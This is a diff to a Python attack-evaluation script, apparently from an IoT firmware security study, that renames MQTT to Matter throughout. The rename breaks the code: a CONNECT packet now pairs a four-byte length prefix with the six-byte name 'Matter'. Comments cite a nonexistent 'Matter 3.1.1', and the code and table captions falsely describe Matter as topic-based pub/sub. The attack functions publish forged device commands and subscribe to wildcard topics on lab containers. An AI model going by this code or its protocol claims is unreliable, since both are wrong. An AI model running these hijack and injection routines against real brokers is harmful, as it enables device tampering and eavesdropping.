@@ -2,12 +2,12 @@
 """
 VESPER Network Traffic Analysis — Packet-Level Attack Evidence
 
-Instruments actual TCP/MQTT communication with firmware containers to produce
+Instruments actual TCP/Matter communication with firmware containers to produce
 verifiable packet-level evidence that attacks deliver malicious payloads over
 the network.  Generates:
 
   1. Per-attack traffic logs (bytes sent, received, payload signatures)
-  2. Protocol breakdown (TCP, MQTT, attack-specific payloads)
+  2. Protocol breakdown (TCP, Matter, attack-specific payloads)
   3. PCAP-like JSON export for post-hoc forensic analysis
   4. Summary table for paper (tab_traffic_analysis.tex)
 
@@ -55,7 +55,7 @@ class CapturedPacket:
     src_port: int
     dst_ip: str
     dst_port: int
-    protocol: str           # "TCP", "MQTT", "UART-over-TCP"
+    protocol: str           # "TCP", "Matter", "UART-over-TCP"
     payload: bytes
     size: int
     attack_name: str = ""
@@ -275,21 +275,21 @@ def run_instrumented_attacks(ports: List[int]) -> List[AttackTrafficProfile]:
             )
             all_profiles.append(profile)
 
-        # === MQTT ATTACKS (Suite 2 subset) ===
-        mqtt_attacks = [
-            ("MQTT Topic Hijack", "mqtt_hijack",
-             _attack_mqtt_topic_hijack, 8.2),
-            ("MQTT Message Injection", "mqtt_injection",
-             _attack_mqtt_message_injection, 7.5),
-            ("MQTT Eavesdropping", "mqtt_eavesdropping",
-             _attack_mqtt_eavesdrop, 6.5),
+        # === Matter ATTACKS (Suite 2 subset) ===
+        matter_attacks = [
+            ("Matter Topic Hijack", "matter_hijack",
+             _attack_matter_topic_hijack, 8.2),
+            ("Matter Message Injection", "matter_injection",
+             _attack_matter_message_injection, 7.5),
+            ("Matter Eavesdropping", "matter_eavesdropping",
+             _attack_matter_eavesdrop, 6.5),
         ]
-        for name, category, attack_fn, cvss in mqtt_attacks:
+        for name, category, attack_fn, cvss in matter_attacks:
             profile = AttackTrafficProfile(
                 attack_name=name,
                 attack_category=category,
                 target_port=port,
-                protocol="MQTT",
+                protocol="Matter",
                 cvss_score=cvss,
             )
             profile.start_time = time.time()
@@ -675,16 +675,16 @@ def _attack_fuzzing(port: int, profile: AttackTrafficProfile):
     sock.close()
 
 
-# ─── MQTT Attack Implementations ─────────────────────────────────────
+# ─── Matter Attack Implementations ─────────────────────────────────────
 
-def _build_mqtt_connect(client_id: str = "vesper-attacker") -> bytes:
-    """Build an MQTT CONNECT packet."""
+def _build_matter_connect(client_id: str = "vesper-attacker") -> bytes:
+    """Build an Matter CONNECT packet."""
     # Fixed header: CONNECT (0x10)
     client_bytes = client_id.encode()
-    # Variable header: protocol name "MQTT", level 4, flags 0x02 (clean session)
+    # Variable header: protocol name "Matter", level 4, flags 0x02 (clean session)
     var_header = (
-        b"\x00\x04MQTT"   # Protocol Name
-        b"\x04"            # Protocol Level (4 = MQTT 3.1.1)
+        b"\x00\x04Matter"   # Protocol Name
+        b"\x04"            # Protocol Level (4 = Matter 3.1.1)
         b"\x02"            # Connect Flags (clean session)
         b"\x00\x3c"        # Keep Alive (60s)
     )
@@ -694,8 +694,8 @@ def _build_mqtt_connect(client_id: str = "vesper-attacker") -> bytes:
     return bytes([0x10, len(remaining)]) + remaining
 
 
-def _build_mqtt_subscribe(topic: str, packet_id: int = 1) -> bytes:
-    """Build an MQTT SUBSCRIBE packet."""
+def _build_matter_subscribe(topic: str, packet_id: int = 1) -> bytes:
+    """Build an Matter SUBSCRIBE packet."""
     topic_bytes = topic.encode()
     # Variable header: packet identifier
     var_header = struct.pack("!H", packet_id)
@@ -705,8 +705,8 @@ def _build_mqtt_subscribe(topic: str, packet_id: int = 1) -> bytes:
     return bytes([0x82, len(remaining)]) + remaining
 
 
-def _build_mqtt_publish(topic: str, message: str, qos: int = 0) -> bytes:
-    """Build an MQTT PUBLISH packet."""
+def _build_matter_publish(topic: str, message: str, qos: int = 0) -> bytes:
+    """Build an Matter PUBLISH packet."""
     topic_bytes = topic.encode()
     msg_bytes = message.encode()
     # Variable header: topic name
@@ -717,44 +717,44 @@ def _build_mqtt_publish(topic: str, message: str, qos: int = 0) -> bytes:
     return bytes([flags, len(remaining)]) + remaining
 
 
-def _attack_mqtt_topic_hijack(port: int, profile: AttackTrafficProfile):
-    """Hijack MQTT topics by subscribing to device command topics."""
-    sock = InstrumentedSocket("localhost", port, profile.attack_name, "mqtt_hijack")
+def _attack_matter_topic_hijack(port: int, profile: AttackTrafficProfile):
+    """Hijack Matter topics by subscribing to device command topics."""
+    sock = InstrumentedSocket("localhost", port, profile.attack_name, "matter_hijack")
     if not sock.connect():
         return
-    # Send MQTT CONNECT
-    connect_pkt = _build_mqtt_connect("attacker-hijack")
+    # Send Matter CONNECT
+    connect_pkt = _build_matter_connect("attacker-hijack")
     sock.send_payload(connect_pkt, phase="probe", is_malicious=True,
-                      signature="MQTT-CONNECT-HIJACK", )
+                      signature="Matter-CONNECT-HIJACK", )
     resp = sock.receive(timeout=1)
 
     # Subscribe to all device topics (wildcard)
-    sub_pkt = _build_mqtt_subscribe("vesper/devices/#")
+    sub_pkt = _build_matter_subscribe("vesper/devices/#")
     sock.send_payload(sub_pkt, phase="exploit", is_malicious=True,
-                      signature="MQTT-SUB-WILDCARD-HIJACK")
+                      signature="Matter-SUB-WILDCARD-HIJACK")
     resp2 = sock.receive(timeout=1)
 
     # Subscribe to command topics specifically
-    sub_cmd = _build_mqtt_subscribe("vesper/devices/+/commands")
+    sub_cmd = _build_matter_subscribe("vesper/devices/+/commands")
     sock.send_payload(sub_cmd, phase="exploit", is_malicious=True,
-                      signature="MQTT-SUB-CMD-HIJACK")
+                      signature="Matter-SUB-CMD-HIJACK")
     resp3 = sock.receive(timeout=1)
 
     profile.success = len(resp) > 0  # CONNACK received
-    profile.exploit_evidence = f"MQTT connected, subscribed to wildcard topics"
+    profile.exploit_evidence = f"Matter connected, subscribed to wildcard topics"
     profile.packets = sock.packets
     sock.close()
 
 
-def _attack_mqtt_message_injection(port: int, profile: AttackTrafficProfile):
-    """Inject malicious MQTT messages to device command topics."""
-    sock = InstrumentedSocket("localhost", port, profile.attack_name, "mqtt_injection")
+def _attack_matter_message_injection(port: int, profile: AttackTrafficProfile):
+    """Inject malicious Matter messages to device command topics."""
+    sock = InstrumentedSocket("localhost", port, profile.attack_name, "matter_injection")
     if not sock.connect():
         return
     # Connect
-    sock.send_payload(_build_mqtt_connect("attacker-injector"),
+    sock.send_payload(_build_matter_connect("attacker-injector"),
                       phase="probe", is_malicious=True,
-                      signature="MQTT-CONNECT-INJECT")
+                      signature="Matter-CONNECT-INJECT")
     resp = sock.receive(timeout=1)
 
     # Inject malicious state change commands
@@ -767,36 +767,36 @@ def _attack_mqtt_message_injection(port: int, profile: AttackTrafficProfile):
          '{"command":"SET_TEMP","value":99,"source":"attacker"}'),
     ]
     for topic, msg in malicious_msgs:
-        pub_pkt = _build_mqtt_publish(topic, msg)
+        pub_pkt = _build_matter_publish(topic, msg)
         sock.send_payload(pub_pkt, phase="exploit", is_malicious=True,
-                          signature=f"MQTT-INJECT-{topic.split('/')[-2]}")
+                          signature=f"Matter-INJECT-{topic.split('/')[-2]}")
 
     profile.success = len(resp) > 0
-    profile.exploit_evidence = f"Injected {len(malicious_msgs)} malicious commands via MQTT"
+    profile.exploit_evidence = f"Injected {len(malicious_msgs)} malicious commands via Matter"
     profile.packets = sock.packets
     sock.close()
 
 
-def _attack_mqtt_eavesdrop(port: int, profile: AttackTrafficProfile):
-    """Passive eavesdropping on MQTT traffic (no authentication required)."""
-    sock = InstrumentedSocket("localhost", port, profile.attack_name, "mqtt_eavesdropping")
+def _attack_matter_eavesdrop(port: int, profile: AttackTrafficProfile):
+    """Passive eavesdropping on Matter traffic (no authentication required)."""
+    sock = InstrumentedSocket("localhost", port, profile.attack_name, "matter_eavesdropping")
     if not sock.connect():
         return
     # Connect without credentials
-    sock.send_payload(_build_mqtt_connect("eavesdropper"),
+    sock.send_payload(_build_matter_connect("eavesdropper"),
                       phase="exploit", is_malicious=True,
-                      signature="MQTT-CONNECT-NOAUTH")
+                      signature="Matter-CONNECT-NOAUTH")
     resp = sock.receive(timeout=1)
 
     # Subscribe to state topics to eavesdrop
-    sock.send_payload(_build_mqtt_subscribe("vesper/devices/+/state"),
+    sock.send_payload(_build_matter_subscribe("vesper/devices/+/state"),
                       phase="exploit", is_malicious=True,
-                      signature="MQTT-SUB-EAVESDROP-STATE")
+                      signature="Matter-SUB-EAVESDROP-STATE")
     resp2 = sock.receive(timeout=1)
 
-    sock.send_payload(_build_mqtt_subscribe("vesper/devices/+/events"),
+    sock.send_payload(_build_matter_subscribe("vesper/devices/+/events"),
                       phase="exploit", is_malicious=True,
-                      signature="MQTT-SUB-EAVESDROP-EVENTS")
+                      signature="Matter-SUB-EAVESDROP-EVENTS")
     resp3 = sock.receive(timeout=1)
 
     profile.success = len(resp) > 0
@@ -1036,9 +1036,9 @@ def generate_latex_table(analysis: Dict[str, Any], output_path: Path):
         "state_manipulation": "State Manip.",
         "replay": "Replay",
         "fuzzing": "Protocol Fuzz",
-        "mqtt_hijack": "MQTT Hijack",
-        "mqtt_injection": "MQTT Injection",
-        "mqtt_eavesdropping": "MQTT Eavesdrop",
+        "matter_hijack": "Matter Hijack",
+        "matter_injection": "Matter Injection",
+        "matter_eavesdropping": "Matter Eavesdrop",
         "arp_spoofing": "ARP Spoofing",
         "network_dos": "SYN Flood",
         "tcp_hijack": "TCP Hijack",
@@ -1069,7 +1069,7 @@ def generate_latex_table(analysis: Dict[str, Any], output_path: Path):
   \emph{Mal.}: payloads containing exploit code, injection strings, or
   overflow data.
   All traffic traverses the Docker bridge network between the attack
-  runner and QEMU firmware containers via UART-over-TCP and MQTT.}
+  runner and QEMU firmware containers via UART-over-TCP and Matter.}
   \label{tab:traffic-analysis}
   \small
   \begin{tabular}{l r r r r r r}
@@ -1110,7 +1110,7 @@ def generate_protocol_table(analysis: Dict[str, Any], output_path: Path):
   \caption{Protocol-level traffic breakdown during security assessment.
   Traffic is captured at the application layer on the Docker bridge
   network (\texttt{172.20.0.0/24}).  UART-over-TCP carries firmware
-  commands; MQTT handles pub/sub device telemetry; TCP-SYN counts
+  commands; Matter handles pub/sub device telemetry; TCP-SYN counts
   half-open connections during flood attacks.}
   \label{tab:protocol-breakdown}
   \small
